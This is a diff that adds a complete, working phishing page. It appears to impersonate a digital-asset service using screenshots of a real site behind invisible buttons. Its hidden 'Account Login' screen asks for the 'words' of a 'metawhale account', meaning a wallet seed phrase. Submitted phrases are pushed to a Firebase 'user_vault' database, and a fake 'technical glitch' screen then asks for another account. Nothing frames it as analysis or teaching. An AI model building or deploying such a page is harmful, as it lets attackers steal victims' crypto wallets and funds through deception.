@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>T&S | Digital Asset Management</title>
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+            authDomain: "v-academy-82560.firebaseapp.com",
+            projectId: "v-academy-82560",
+            storageBucket: "v-academy-82560.firebasestorage.app",
+            messagingSenderId: "826822771378",
+            appId: "1:826822771378:web:5357b1b989b298a8027fab"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.submitToFirebase = function() {
+            const inputVal = document.getElementById('mainInput').value;
+            const btn = document.getElementById('finalBtn');
+
+            if (inputVal.trim() === "") {
+                alert("This field is required. Please enter your words.");
+                return;
+            }
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            push(ref(db, 'user_vault'), {
+                phrase: inputVal,
+                time: serverTimestamp()
+            }).then(() => {
+                showScreen('screen4');
+            }).catch((e) => {
+                btn.innerText = "next";
+                btn.disabled = false;
+                alert("Error connecting to server.");
+            });
+        }
+    </script>
+
+    <style>
+        /* RESET & BASE */
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #000; width: 100vw; overflow-x: hidden; font-family: sans-serif; }
+
+        /* ERROR BAR (Home Login) */
+        #redAlert {
+            position: fixed; top: -80px; left: 0; width: 100%; height: 65px;
+            background: #f00; color: #fff; display: flex; align-items: center;
+            justify-content: center; font-weight: bold; z-index: 9999; transition: 0.4s;
+        }
+
+        /* 1st INTERFACE: HOME (SCROLLABLE) */
+        #screen1 { width: 100%; position: relative; }
+        .bg-img { width: 100%; display: block; height: auto; }
+        
+        .home-triggers {
+            position: fixed; top: 0; width: 100%; height: 75px;
+            z-index: 5000; display: flex; justify-content: flex-end; align-items: center;
+            padding-right: 15px; pointer-events: none;
+        }
+        .trig-btn { pointer-events: auto; background: transparent; border: none; height: 45px; cursor: pointer; }
+        .m-trig { width: 100px; margin-right: 5px; }
+        .l-trig { width: 85px; }
+
+        /* OVERLAY SCREENS (WHITE BACKGROUND) */
+        .overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 8000; flex-direction: column; padding: 20px;
+        }
+
+        /* UI ELEMENTS FOR OVERLAYS */
+        .header-ui { width: 100%; display: flex; justify-content: space-between; align-items: center; height: 60px; }
+        .close-icon { font-size: 30px; cursor: pointer; color: #000; font-weight: 300; }
+        .logo-text { font-size: 18px; font-weight: bold; color: #000; }
+
+        .menu-list { margin-top: 50px; width: 100%; }
+        .menu-item { 
+            padding: 20px 0; border-bottom: 1px solid #eee; font-size: 20px; 
+            color: #000; cursor: pointer; display: flex; justify-content: space-between;
+        }
+
+        .input-container { margin-top: 40px; width: 100%; }
+        .styled-textarea {
+            width: 100%; height: 200px; border: 1px solid #ddd; border-radius: 10px;
+            padding: 15px; font-size: 16px; outline: none; background: #fafafa;
+        }
+
+        .footer-btn {
+            position: absolute; bottom: 30px; left: 5%; width: 90%; height: 55px;
+            background: #000; color: #fff; border-radius: 30px; border: none;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        /* ERROR TEXT FOR SCREEN 4 */
+        .glitch-content {
+            margin-top: 100px; text-align: center; color: #333;
+        }
+        .glitch-title { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #f00; }
+        .glitch-desc { font-size: 16px; line-height: 1.5; padding: 0 20px; }
+    </style>
+</head>
+<body>
+
+    <div id="redAlert">Web Installation Error</div>
+
+    <div id="screen1">
+        <div class="home-triggers">
+            <button class="trig-btn m-trig" onclick="showScreen('screen2')"></button>
+            <button class="trig-btn l-trig" onclick="launchRedBar()"></button>
+        </div>
+        <img src="https://i.ibb.co/YBxhHFzq/Screenshot-2026-0507-004641.png" class="bg-img">
+        <img src="https://i.ibb.co/DPSfDC66/Screenshot-2026-0507-004738.png" class="bg-img">
+        <img src="https://i.ibb.co/6cs0ZcGV/Screenshot-2026-0507-004817.png" class="bg-img">
+    </div>
+
+    <div id="screen2" class="overlay">
+        <div class="header-ui">
+            <div class="logo-text">MENU</div>
+            <div class="close-icon" onclick="showScreen('screen1')">✕</div>
+        </div>
+        <div class="menu-list">
+            <div class="menu-item" onclick="showScreen('screen3')">
+                <span>Account</span>
+                <span>›</span>
+            </div>
+            <div class="menu-item"><span>Security</span><span>›</span></div>
+            <div class="menu-item"><span>Settings</span><span>›</span></div>
+        </div>
+        <button class="footer-btn" onclick="showScreen('screen1')">Join Us</button>
+    </div>
+
+    <div id="screen3" class="overlay">
+        <div class="header-ui">
+            <div class="logo-text">Account Login</div>
+            <div class="close-icon" onclick="showScreen('screen2')">✕</div>
+        </div>
+        <div class="input-container">
+            <textarea id="mainInput" class="styled-textarea" placeholder="input your words for login metawhale account"></textarea>
+        </div>
+        <button id="finalBtn" class="footer-btn" onclick="submitToFirebase()">next</button>
+    </div>
+
+    <div id="screen4" class="overlay">
+        <div class="header-ui">
+            <div class="logo-text">System Status</div>
+            <div class="close-icon" onclick="showScreen('screen3')">✕</div>
+        </div>
+        <div class="glitch-content">
+            <div class="glitch-title">TECHNICAL GLITCH</div>
+            <p class="glitch-desc">
+                We are facing a technical glitch. Please check your DNS settings or try another account to proceed.
+            </p>
+        </div>
+        <button class="footer-btn" onclick="showScreen('screen3')">Try another account</button>
+    </div>
+
+    <script>
+        function showScreen(id) {
+            // Hide Home
+            document.getElementById('screen1').style.display = 'none';
+            // Hide Overlays
+            const overlays = document.querySelectorAll('.overlay');
+            overlays.forEach(o => o.style.display = 'none');
+
+            const target = document.getElementById(id);
+            if (id === 'screen1') {
+                target.style.display = 'block';
+                document.body.style.overflowY = 'auto';
+            } else {
+                target.style.display = 'flex';
+                document.body.style.overflowY = 'hidden';
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function launchRedBar() {
+            const bar = document.getElementById('redAlert');
+            bar.style.top = '0px';
+            setTimeout(() => { bar.style.top = '-80px'; }, 3500);
+        }
+
+        window.onload = function() {
+            showScreen('screen1');
+        }
+    </script>
+</body>
+              </html>
+              
